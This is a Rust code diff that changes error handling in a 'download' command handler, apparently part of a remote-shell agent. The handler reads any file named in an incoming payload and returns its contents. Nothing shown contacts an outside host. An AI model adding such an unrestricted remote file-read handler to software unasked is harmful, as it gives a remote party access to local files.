@@ -1,16 +1,15 @@
-use super::request_or_response::{maybe_string, Request, make_shell_target};
+use super::{request_or_response::{maybe_string, Request, make_shell_target}, command_error::make_error_bytes};
 
 pub const COMMAND_NAME: &str = "download";
 pub const COMMAND_ALIAS: &str = "cp";
 
 pub fn process_download_command(
     payload: &[u8],
-) -> Option<Vec<u8>> {
+) -> Result<Vec<u8>, Vec<u8>> {
     let file_path = maybe_string(Some(payload));
 
     if file_path.is_none() {
-        eprintln!("No file path provided");
-        return None;
+        return Result::Err(make_error_bytes("No file path provided"));
     }
 
     let file_path = file_path.unwrap();
@@ -20,14 +19,14 @@ pub fn process_download_command(
     let file_path = std::path::Path::new(&file_path);
 
     if !file_path.is_file() {
-        return None;
+        return Result::Err(make_error_bytes(format!("File {} does not exist", file_path.to_str().unwrap()).as_str()));
     }
 
     let file_contents = std::fs::read(file_path);
 
     return match file_contents {
-        Ok(file_contents) => Some(file_contents),
-        Err(_) => None
+        Ok(file_contents) => Result::Ok(file_contents),
+        Err(_) => Result::Err(make_error_bytes(format!("Cannot read file {}", file_path.to_str().unwrap()).as_str()))
     }
 }
 
